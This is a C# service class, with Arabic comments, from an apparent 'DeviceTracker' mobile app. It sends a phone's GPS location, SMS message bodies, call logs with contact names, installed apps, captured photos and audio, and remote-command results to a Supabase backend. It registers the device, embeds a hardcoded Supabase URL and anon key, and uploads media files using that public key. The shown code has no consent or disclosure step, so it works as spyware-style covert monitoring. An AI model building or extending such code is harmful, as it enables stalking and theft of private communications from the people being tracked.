using System.Net.Http.Headers;
using System.Text;
using DeviceTracker.Models;
using Newtonsoft.Json;

namespace DeviceTracker.Services;

/// <summary>
/// خدمة التواصل مع Supabase.
/// تدعم وضعين:
///   1. Direct REST API (مع anon key) — للقراءة فقط
///   2. Edge Function /ingest — للكتابة الآمنة
///
/// المصادقة:
///   - Direct: anon key (مكشوف في الكود، آمن نسبياً مع RLS)
///   - Edge Function: device_token (سري لكل جهاز)
///
/// الوضع الافتراضي: Edge Function للكتابة، Direct للقراءة.
/// </summary>
public sealed class SupabaseService : IDisposable
{
    private readonly HttpClient _directHttp;   // للقراءة (anon key)
    private readonly HttpClient _ingestHttp;    // للكتابة (Edge Function)
    private readonly EncryptionService _encryption;

    private static string SupabaseUrl =>
        Preferences.Get("supabase_url", "https://accisrkoevfqqiwglswe.supabase.co");

    private static string AnonKey =>
        Preferences.Get("supabase_anon_key",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFjY2lzcmtvZXZmcXFpd2dsc3dlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkzMjAzNzQsImV4cCI6MjA5NDg5NjM3NH0.xJWT0Ft5PE3b7F5UZ4DorYLTr3ykM5wU1LVuvt_RuXQ");

    private static string DeviceToken =>
        Preferences.Get("device_token", string.Empty);

    private static string EdgeFunctionUrl =>
        $"{SupabaseUrl.TrimEnd('/')}/functions/v1/ingest/v1";

    public SupabaseService(EncryptionService encryption)
    {
        _encryption = encryption;

        // HttpClient للقراءة المباشرة (anon key)
        _directHttp = new HttpClient
        {
            BaseAddress = new Uri(SupabaseUrl.TrimEnd('/') + "/rest/v1/"),
            Timeout = TimeSpan.FromSeconds(15)
        };
        _directHttp.DefaultRequestHeaders.Add("apikey", AnonKey);
        _directHttp.DefaultRequestHeaders.Authorization =
            new AuthenticationHeaderValue("Bearer", AnonKey);

        // HttpClient لـ Edge Function (device token)
        _ingestHttp = new HttpClient
        {
            BaseAddress = new Uri(EdgeFunctionUrl.TrimEnd('/') + "/"),
            Timeout = TimeSpan.FromSeconds(30)
        };
    }

    /// <summary>
    /// تسجيل الجهاز: يستدعي register_device() RPC — SECURITY DEFINER (يتجاوز RLS)
    /// </summary>
    public async Task<bool> RegisterDeviceAsync(string deviceSerial)
    {
        try
        {
            var payload = new
            {
                p_device_serial = deviceSerial,
                p_device_name = DeviceInfo.Name,
                p_manufacturer = DeviceInfo.Manufacturer,
                p_model = DeviceInfo.Model,
                p_os_version = $"{DeviceInfo.Platform} {DeviceInfo.VersionString}",
                p_public_key = Preferences.Get("encryption_key", string.Empty)
            };

            var json = JsonConvert.SerializeObject(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            var response = await _directHttp.PostAsync("rpc/register_device", content);

            if (response.IsSuccessStatusCode)
            {
                var body = await response.Content.ReadAsStringAsync();
                // الـ RPC يرجع JSON array: [{"device_token":"..."}]
                var tokens = JsonConvert.DeserializeObject<List<Dictionary<string, string>>>(body);
                var token = tokens?.FirstOrDefault()?.GetValueOrDefault("device_token");

                if (!string.IsNullOrEmpty(token))
                {
                    Preferences.Set("device_token", token);
                    Preferences.Set("device_serial", deviceSerial);
                    System.Diagnostics.Debug.WriteLine(
                        $"[Supabase] Registered OK, token={token[..8]}...");
                    return true;
                }
            }
            else
            {
                var err = await response.Content.ReadAsStringAsync();
                System.Diagnostics.Debug.WriteLine(
                    $"[Supabase] Register failed ({response.StatusCode}): {err}");
            }

            return false;
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[Supabase] Register error: {ex.Message}");
            return false;
        }
    }

    /// <summary>
    /// رفع بيانات الموقع — عبر Edge Function
    /// </summary>
    public async Task<bool> PushLocationAsync(LocationRecord record)
    {
        return await IngestAsync("location_history", new
        {
            latitude = _encryption.Encrypt(record.Latitude.ToString("F6")),
            longitude = _encryption.Encrypt(record.Longitude.ToString("F6")),
            altitude = record.Altitude,
            accuracy = record.Accuracy,
            speed = record.Speed,
            bearing = record.Bearing,
            captured_at = record.CapturedAt.ToString("o")
        });
    }

    /// <summary>
    /// رفع حالة الجهاز — عبر Edge Function
    /// </summary>
    public async Task<bool> PushDeviceStateAsync(DeviceStateRecord record)
    {
        return await IngestAsync("device_state_snapshots", new
        {
            battery_level = record.BatteryLevel,
            battery_status = record.BatteryStatus,
            network_type = record.NetworkType,
            storage_total = record.StorageTotal,
            storage_available = _encryption.Encrypt(record.StorageAvailable.ToString()),
            is_charging = record.IsCharging,
            captured_at = record.CapturedAt.ToString("o")
        });
    }

    /// <summary>
    /// رفع سجل مكالمة — عبر Edge Function
    /// </summary>
    public async Task<bool> PushCallLogAsync(CallLogRecord record)
    {
        return await IngestAsync("call_logs", new
        {
            phone_number = _encryption.Encrypt(record.PhoneNumber),
            contact_name = _encryption.Encrypt(record.ContactName),
            call_type = record.CallType,
            duration_seconds = record.DurationSeconds,
            call_date = record.CallDate.ToString("o")
        });
    }

    /// <summary>
    /// رفع رسالة SMS — عبر Edge Function
    /// </summary>
    public async Task<bool> PushSmsAsync(SmsRecord record)
    {
        return await IngestAsync("sms_messages", new
        {
            phone_number = _encryption.Encrypt(record.PhoneNumber),
            message_body = _encryption.Encrypt(record.MessageBody),
            message_type = record.MessageType,
            is_read = record.IsRead,
            sms_date = record.SmsDate.ToString("o")
        });
    }

    /// <summary>
    /// رفع التطبيقات المثبتة — عبر Edge Function
    /// </summary>
    public async Task<bool> PushInstalledAppsAsync(IEnumerable<InstalledAppRecord> apps)
    {
        var ok = true;
        foreach (var a in apps)
        {
            if (!await IngestAsync("installed_applications", new
            {
                package_name = _encryption.Encrypt(a.PackageName),
                app_name = _encryption.Encrypt(a.AppName),
                version_name = a.VersionName,
                version_code = a.VersionCode,
                is_system_app = a.IsSystemApp,
                captured_at = a.CapturedAt.ToString("o")
            })) ok = false;
        }
        return ok;
    }

    /// <summary>
    /// تحديث حالة أمر عن بعد (تنفيذ/فشل) — عبر Edge Function
    /// </summary>
    public async Task<bool> UpdateCommandStatusAsync(string commandId, string status)
    {
        return await IngestAsync("command_status", new
        {
            command_id = commandId,
            status,
            executed_at = DateTime.UtcNow.ToString("o")
        }, usePatch: true);
    }

    /// <summary>
    /// رفع ملف وسائط (صورة/صوت) إلى Supabase Storage + تسجيل في media_captures
    /// </summary>
    public async Task<bool> PushMediaCaptureAsync(MediaCaptureRecord record)
    {
        try
        {
            var storageUrl = await UploadFileAsync(record.FilePath, record.MediaType);
            if (storageUrl == null) return false;

            return await IngestAsync("media_captures", new
            {
                media_type = record.MediaType,
                file_url = storageUrl,
                file_size_bytes = record.FileSizeBytes,
                mime_type = record.MimeType,
                duration_seconds = record.DurationSeconds,
                captured_at = record.CapturedAt.ToString("o")
            });
        }
        catch { return false; }
    }

    // ================================================================
    //  الأساس: إرسال إلى Edge Function
    // ================================================================

    private async Task<bool> IngestAsync(string table, object payload, bool usePatch = false)
    {
        try
        {
            var token = DeviceToken;
            if (string.IsNullOrEmpty(token))
            {
                System.Diagnostics.Debug.WriteLine("[Supabase] No device token, skipping ingest");
                return false;
            }

            var json = JsonConvert.SerializeObject(payload,
                Formatting.None,
                new JsonSerializerSettings
                {
                    NullValueHandling = NullValueHandling.Ignore,
                    DateTimeZoneHandling = DateTimeZoneHandling.Utc
                });

            var method = usePatch ? HttpMethod.Patch : HttpMethod.Post;
            var request = new HttpRequestMessage(method, table)
            {
                Content = new StringContent(json, Encoding.UTF8, "application/json")
            };
            request.Headers.Add("x-device-token", token);

            var response = await _ingestHttp.SendAsync(request);

            if (!response.IsSuccessStatusCode)
            {
                var err = await response.Content.ReadAsStringAsync();
                System.Diagnostics.Debug.WriteLine(
                    $"[Supabase] Ingest {table} failed ({response.StatusCode}): {err?[..Math.Min(err.Length, 100)]}");
            }

            return response.IsSuccessStatusCode;
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[Supabase] Ingest error: {ex.Message}");
            return false;
        }
    }

    // ================================================================
    //  رفع الملفات إلى Supabase Storage
    // ================================================================

    private async Task<string?> UploadFileAsync(string filePath, string folder)
    {
        try
        {
            if (!File.Exists(filePath)) return null;

            var fileBytes = await File.ReadAllBytesAsync(filePath);
            var fileName = Path.GetFileName(filePath);
            var storageUrl = $"{SupabaseUrl.TrimEnd('/')}/storage/v1/object/{folder}/{fileName}";

            using var content = new ByteArrayContent(fileBytes);
            content.Headers.ContentType = new MediaTypeHeaderValue(
                GetMimeType(fileName));

            var request = new HttpRequestMessage(HttpMethod.Post, storageUrl)
            {
                Content = content
            };
            request.Headers.Add("apikey", AnonKey);
            request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", AnonKey);

            var response = await _directHttp.SendAsync(request);
            return response.IsSuccessStatusCode ? storageUrl : null;
        }
        catch
        {
            return null;
        }
    }

    // ================================================================
    //  توليد Device Token
    // ================================================================

    private static string GenerateDeviceToken()
    {
        var random = new byte[48];
        using var rng = System.Security.Cryptography.RandomNumberGenerator.Create();
        rng.GetBytes(random);
        var token = Convert.ToBase64String(random)
            .Replace("/", "a").Replace("+", "b").Replace("=", "");
        return token.Length > 64 ? token[..64] : token;
    }

    private static readonly Dictionary<string, string> MimeMap = new(StringComparer.OrdinalIgnoreCase)
    {
        [".jpg"] = "image/jpeg", [".jpeg"] = "image/jpeg", [".png"] = "image/png",
        [".gif"] = "image/gif", [".webp"] = "image/webp", [".bmp"] = "image/bmp",
        [".mp4"] = "video/mp4", [".3gp"] = "video/3gpp", [".webm"] = "video/webm",
        [".mp3"] = "audio/mpeg", [".aac"] = "audio/aac", [".wav"] = "audio/wav",
        [".ogg"] = "audio/ogg", [".amr"] = "audio/amr", [".txt"] = "text/plain",
        [".json"] = "application/json", [".xml"] = "application/xml",
        [".pdf"] = "application/pdf", [".zip"] = "application/zip"
    };

    private static string GetMimeType(string fileName)
    {
        var ext = Path.GetExtension(fileName);
        return ext != null && MimeMap.TryGetValue(ext, out var mime) ? mime : "application/octet-stream";
    }

    public void Dispose()
    {
        _directHttp?.Dispose();
        _ingestHttp?.Dispose();
    }
}
